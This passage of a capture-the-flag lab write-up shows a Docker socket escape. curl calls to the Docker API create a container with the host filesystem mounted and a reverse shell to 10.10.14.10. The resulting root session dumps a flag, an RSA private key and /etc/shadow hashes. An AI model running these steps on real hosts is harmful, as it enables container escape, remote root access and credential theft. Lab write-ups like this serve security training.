Lets try to escape through the mounted docker socket.
```bash
application@4dae106254bf:/dev/shm$ find / -name docker.sock 2>/dev/null    
/app/docker.sock
```

Google for _"exploit docker sock"_ and the [first hit](https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25) is a nice bash script to escape. Follow the script step-by-step.

(1) Find available images:
```bash
application@4dae106254bf:/dev/shm$ curl -s --unix-socket /app/docker.sock http://localhost/images/json
[{"Containers":-1,"Created":1656086146,"Id":"sha256:b97d15b16a2172a201a80266877a65a44b0d7fa31c29531c20cdcc8e98c2d227","Labels":{"io.webdevops.layout":"8","io.webdevops.version":"1.5.0","maintainer":"info@webdevops.io","vendor":"WebDevOps.io"},"ParentId":"sha256:762bfd88e0120a1018e9a4ccbe56d654c27418c7183ff4a817346fd2ac8b69af","RepoDigests":null,"RepoTags":["laravel-app_main:latest"],"SharedSize":-1,"Size":1975239137,"VirtualSize":1975239137},{"Containers":-1,"Created":1655515586,"Id":"sha256:ca37554c31eb2513cf4b1295d854589124f8740368842be843d2b4324edd4b8e","Labels":{"io.webdevops.layout":"8","io.webdevops.version":"1.5.0","maintainer":"info@webdevops.io","vendor":"WebDevOps.io"},"ParentId":"","RepoDigests":null,"RepoTags":["webdevops/php-apache:7.4"],"SharedSize":-1,"Size":1028279761,"VirtualSize":1028279761},{"Containers":-1,"Created":1640902141,"Id":"sha256:6af04a6ff8d579dc4fc49c3f3afcaef2b9f879a50d8b8a996db2ebe88b3983ce","Labels":{"maintainer":"Thomas Bruederli <thomas@roundcube.net>"},"ParentId":"","RepoDigests":["roundcube/roundcubemail@sha256:f5b054716e2fdf06f4c5dbee70bc6e056b831ca94508ba0fc1fcedc8c00c5194"],"RepoTags":["roundcube/roundcubemail:latest"],"SharedSize":-1,"Size":612284073,"VirtualSize":612284073},{"Containers":-1,"Created":1640805761,"Id":"sha256:c99e357e6daee694f9f431fcc905b130f7a246d8c172841820042983ff8df705","Labels":null,"ParentId":"","RepoDigests":["composer@sha256:5e0407cda029cea056de126ea1199f351489e5835ea092cf2edd1d23ca183656"],"RepoTags":["composer:latest"],"SharedSize":-1,"Size":193476514,"VirtualSize":193476514},{"Containers":-1,"Created":1640297121,"Id":"sha256:cec4e9432becb39dfc2b911686d8d673b8255fdee4a501fbc1bda87473fb479d","Labels":{"org.opencontainers.image.authors":"The Docker Mailserver Organization on GitHub","org.opencontainers.image.description":"A fullstack but simple mail server (SMTP, IMAP, LDAP, Antispam, Antivirus, etc.). Only configuration files, no SQL database.","org.opencontainers.image.documentation":"https://github.com/docker-mailserver/docker-mailserver/blob/master/README.md","org.opencontainers.image.licenses":"MIT","org.opencontainers.image.revision":"061bae6cbfb21c91e4d2c4638d5900ec6bee2802","org.opencontainers.image.source":"https://github.com/docker-mailserver/docker-mailserver","org.opencontainers.image.title":"docker-mailserver","org.opencontainers.image.url":"https://github.com/docker-mailserver","org.opencontainers.image.vendor":"The Docker Mailserver Organization","org.opencontainers.image.version":"refs/tags/v10.4.0"},"ParentId":"","RepoDigests":["mailserver/docker-mailserver@sha256:80d4cff01d4109428c06b33ae8c8af89ebebc689f1fe8c5ed4987b803ee6fa35"],"RepoTags":["mailserver/docker-mailserver:latest"],"SharedSize":-1,"Size":560264926,"VirtualSize":560264926},{"Containers":-1,"Created":1640059378,"Id":"sha256:badd93b4fdf82c3fc9f2c6bc12c15da84b7635dc14543be0c1e79f98410f4060","Labels":{"maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2021-12-21T03:59:32Z","org.opencontainers.image.revision":"877040e6521e48c363cfe461746235dce4ab822b","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"},"ParentId":"","RepoDigests":["gitea/gitea@sha256:eafb7459a4a86a0b7da7bfde9ef0726fa0fb64657db3ba2ac590fec0eb4cdd0c"],"RepoTags":["gitea/gitea:1.15.8"],"SharedSize":-1,"Size":148275092,"VirtualSize":148275092},{"Containers":-1,"Created":1640055479,"Id":"sha256:dd3b2a5dcb48ff61113592ed5ddd762581be4387c7bc552375a2159422aa6bf5","Labels":null,"ParentId":"","RepoDigests":["mysql@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae"],"RepoTags":["mysql:5.6"],"SharedSize":-1,"Size":302527523,"VirtualSize":302527523},{"Containers":-1,"Created":1639694686,"Id":"sha256:0f7cb85ed8af5c33c1ca00367e4b1e4bfae6ec424f52bb04850af73fb19831d7","Labels":null,"ParentId":"","RepoDigests":["php@sha256:6eb4c063a055e144f4de1426b82526f60d393823cb017add32fb85d79f25b62b"],"RepoTags":["php:7.4-fpm-alpine"],"SharedSize":-1,"Size":82510913,"VirtualSize":82510913}
```
At the top we find `laravel-app_main:latest` - lets use that one.

(2) Declare the `cmd` variable, change IP address and port to fit our needs. This command will be triggered when we start the container.
```bash
application@4dae106254bf:/dev/shm$ cmd="[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i &>/dev/tcp/10.10.14.10/4499 0<&1'\\\"\"]"
```

(3) Create the container and execute command, bind the root filesystem to it, name the container `exploit.se_root` and execute as detached (-d)
```bash
application@4dae106254bf:/dev/shm$ curl -s -X POST --unix-socket /app/docker.sock -d "{\"Image\":\"laravel-app_main\",\"cmd\":$cmd,\"Binds\":[\"/:/tmp:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=exploit.se_root
```

(4) Start the container - and trigger the reverse shell
```bash
application@4dae106254bf:/dev/shm$ curl -s -X POST --unix-socket /app/docker.sock "http://localhost/containers/exploit.se_root/start"
```

```bash
➜  extension nc -lvnp 4499
listening on [any] 4499 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.171] 57132
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@cbe7b6cef335:/# id
uid=0(root) gid=0(root) groups=0(root)

root@cbe7b6cef335:/# cat /root/root.txt
9bf63e789d19a7507442df8e42d41225

root@cbe7b6cef335:/# cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxhCO2ZdFzdJj6zdL/L38ZGE7OzyRCnJ4qZJyz50X7Ux9JHWT
7kZWP3uElhlwF2WbqsPoS/iUtAjV9keflS/38zfZEp1n/o7g+q8Fw+oxF0s/6fud
hA4KieW/bKnG+aeaC/lBgx5L5EGqsw+RKeBqFmCVi8ySy1SEH4vy7mZzWO4w6Egy
ywWyk1gxGBEUuq1xVT0Wvagw+AQtkTJ9jo7wEGA1kAsY0G02hbwelLSPppTx72Ei
Pyr2hb9m5pwK6ywz38+4h4dPkyijcbaR0LNNKzDaeBGD78RxbnszHUTXKO/EsQYD
qEYqbFkSMgoMylW8wbxtS1I7T+TW4+tvQzgw9QIDAQABAoIBAQCH384PqX4Cj6Vq
NHoVfcQKnMVEgu1BTHxIYCYRFUTXztQ+0cZU/L2oOTUgv3ytIFBlGpZen75rr3AQ
ztvEPa8MlDB/W6p+8EeY0b7TwvJAd6f1/V32vKcwKINkqSfOFtNQCYOOzpbjlMTk
p/Y+0ywUA9gzmnjNskIdXiWetHvG8hNBArCU2h9CdlAr2thi3j1j3DR7VBUvuwtw
6ny1422XL8xyIMg1qjLh9kFy6Ndif+GmnzuoQW4a18lDflIZQC+03MPRaZUuUbVE
pTIDztWjs1+YeVoGPq4nzy+1RsyrxCdA+0+0j6ZK6/++vJPsm+V1/xaModV+XRyg
TjsQ0MJBAoGBAOnZ7qtDS/3qSXV6e+kzYcJUTF1d18gXaKfrEm3y09eKJ9mnApTf
fW99PlP+wK+eLUbsdxz9xiBxGGuxB+XYclDLIkoIn2308ruBptYMz7LYkcaypsCB
XEdi5bY8PlkXICXVhLaFNACydFf0Ve8cj4XG2t1WcBhKbVgCvIKbrzhxAoGBANjS
7TmGIIdZarvx4icPboemviW6wbXYY79jGFA+zvQ6DFt3cNoLYKpFfzZoaOXrJyix
ocFijM0Jc+BX0c13bhCgnjxnZ2/IV3ggeEjKVeuV5wx1+TzdjpR0EAbvWUjd2Q41
xSL6kSRI+Po/6Tn9GuzWidMrygWMNT1JhEVVbuLFAoGALDI1+0QyvoBi9cL6XC6L
0VBhRlwQBg72hpXU29bC1r+TnH0F7eD3MfT3rKQ/AnHgmMDkGiSUJ1l4hhHlLjlk
EYTyrA9JIlzi6zEruNSfBGwN0QG+pi9Mo2k7hN+J4QiP2NaryFsQYvlXJ7BT9Wbu
cRgOETre4JhgZfvOaNjHmuECgYBnW70cA9Uz0CsyJq8g4ZlV7uWLxMgcsGd0T3/C
mP48rANCAuD4AB53bKOkwwbmOz+yhWLPdfQatZvYYOSxZnJAWOC1eLF1NvKDYC8W
u+VTZWT7qq1CF3elSuJs++H6+05CGN29u+Y+fs65NIgwTXhtWCPhV2l5VYn3ijkU
eBJg5QKBgQChntZ26dV5zBuH+sUBFDD38ATjMKWwKBy4EhogrPP1WPODi7MfPlSW
9Pp/C6+rAd91VPcGo6TJD15CDhzTfzffHnjZJ0Nb6HDRL7mw6oimwVTLJttUk8GV
QGGCfL85CcYSjPpqQp8ZOml4k/SaSzDUhb06PCuFi+i4afyuQyHAzw==
-----END RSA PRIVATE KEY-----

root@cbe7b6cef335:/# cat /etc/shadow
root:$6$XJ0deONw$c1ag/76NHYRVSxMwMeoYPUDsxZDdjC6sX5KKa.QUHi2mjIwN1NlLyRt3QS3E6JjPknuSSOyIUcTTq2SbIXZle/:19157:0:99999:7:::
jean:$6$2ct8z568$.FX4a9sSYGk0QxQiqfiMFIRu.oGdRvGcFgtOz3Hu9bV2i6/Z.IpWlZxZn5iySUJuq9Rqw6oS8yTSFxbAZ4ede.:19156:0:99999:7:::
charlie:$6$Ai.uOoSz$8QB.fXSM7pS2DDpUNBR3Xr3v3MUqlWdSmwEtOjOaRpH73UxGrcxJ/hPkM7h.MfFHM2gzoyHL0.c7s/glcc0Fu.:18995:0:99999:7:::
```
